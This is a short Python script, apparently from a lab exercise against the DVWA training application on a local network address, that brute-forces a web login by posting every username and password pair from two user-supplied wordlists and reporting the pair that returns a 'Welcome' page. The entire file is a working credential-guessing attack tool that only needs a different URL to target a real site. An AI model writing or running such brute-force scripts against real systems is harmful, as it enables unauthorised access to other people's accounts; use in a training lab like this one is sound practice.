from requests import post
import colorama

colorama.init() ## initialize the colorama

url = "http://192.168.1.105/dvwa/login.php"

usernamefile = input("Username List : ")
passwordfile = input("Password List : ")

find = False
for username in open(usernamefile):
    username = username.strip("\n")
    for password in open(passwordfile):
        password = password.strip('\n')
        print (colorama.Fore.RED + "{}:{}".format(username,password))
        res = post(url,data = {"username" : username , "password" : password , "Login" : "Login"})
        content = res.content
        content = content.decode()
        if "Welcome" in content:
            print("-"*50)
            print(colorama.Fore.GREEN + "Correct USERNAME / PASSWORD --> {}:{}".format(username,password))
            find = True
            break
    if find :
        break
